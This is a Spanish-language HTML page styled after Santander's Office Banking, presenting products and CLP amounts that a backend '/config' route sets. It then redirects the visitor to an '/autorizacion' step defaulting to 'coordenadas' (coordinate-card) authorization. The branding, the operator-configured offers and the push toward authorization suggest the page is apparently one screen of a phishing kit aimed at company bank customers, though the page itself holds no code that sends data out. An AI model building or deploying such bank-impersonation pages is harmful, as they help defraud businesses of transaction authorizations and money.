<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Productos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    .producto {
      display: flex;
      align-items: flex-start;
      margin-bottom: 20px;
    }
    .producto label {
      display: flex;
      align-items: flex-start;
      font-size: 14px;
      line-height: 1.4;
    }
    .producto input[type="radio"] {
      margin-right: 8px;
      margin-top: 3px;
    }
    .producto span {
      display: inline-block;
      max-width: 250px;
      word-wrap: break-word;
    }
    #mensaje {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h1>PRODUCTOS DISPONIBLES PARA TU EMPRESA:</h1>

    <!-- Contenedor dinámico -->
    <div id="listaProductos"></div>

    <button class="btn-santander" id="quieroBtn">
      LO QUIERO<span class="bg-arrow"></span>
    </button>

    <div id="mensaje"></div>
  </div>
 
  <script>
    const API_URL = "/config"; // ruta relativa al backend

    // Formato CLP
    function formatoCLP(valor){
      return new Intl.NumberFormat("es-CL", {
        style: "currency",
        currency: "CLP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(valor);
    }

    let tipoAutorizacion = "coordenadas"; // valor por defecto

    document.addEventListener("DOMContentLoaded", () => {
      fetch(API_URL)
        .then(res => res.json())
        .then(data => {
          const contenedor = document.getElementById("listaProductos");
          contenedor.innerHTML = "";

          let contador = 1;

          // Producto 1
          if(data.producto1 && data.producto1.trim() !== ""){
            contenedor.innerHTML += `
              <div class="producto">
                <label>
                  <input type="radio" name="opcion" value="producto1"> 
                  <span>${contador}.- ${data.producto1} por ${data.monto1 ? formatoCLP(data.monto1) : ""}</span>
                </label>
              </div>`;
            contador++;
          }

          // Producto 2
          if(data.producto2 && data.producto2.trim() !== ""){
            contenedor.innerHTML += `
              <div class="producto">
                <label>
                  <input type="radio" name="opcion" value="producto2"> 
                  <span>${contador}.- ${data.producto2} por ${data.monto2 ? formatoCLP(data.monto2) : ""}</span>
                </label>
              </div>`;
            contador++;
          }

          // Producto 3 (Visualización de Tarjeta)
          if(data.producto3 && data.producto3.trim() !== ""){
            contenedor.innerHTML += `
              <div class="producto">
                <label>
                  <input type="radio" name="opcion" value="producto3"> 
                  <span>${contador}.- ${data.producto3} ${data.monto3 ? "por " + formatoCLP(data.monto3) : ""}</span>
                </label>
              </div>`;
            contador++;
          }

          tipoAutorizacion = data.tipoAutorizacion || "coordenadas";
        })
        .catch(err => {
          console.error("Error al cargar configuración:", err);
          document.getElementById("mensaje").innerText = "⚠️ No se pudo cargar configuración del servidor.";
        });
    });

    document.getElementById("quieroBtn").addEventListener("click", function(){
      const seleccion = document.querySelector('input[name="opcion"]:checked');
      if(!seleccion){
        document.getElementById("mensaje").innerText = "⚠️ Debes seleccionar un producto.";
        return;
      }

      localStorage.setItem("seleccionProducto", seleccion.value);
      document.getElementById("mensaje").innerText = "Serás redirigido al área de autorización...";

      setTimeout(() => {
        // Redirige según tipo de autorización configurado
        window.location.href = "/autorizacion";
      }, 2000);
    });
  </script>
</body>
</html>
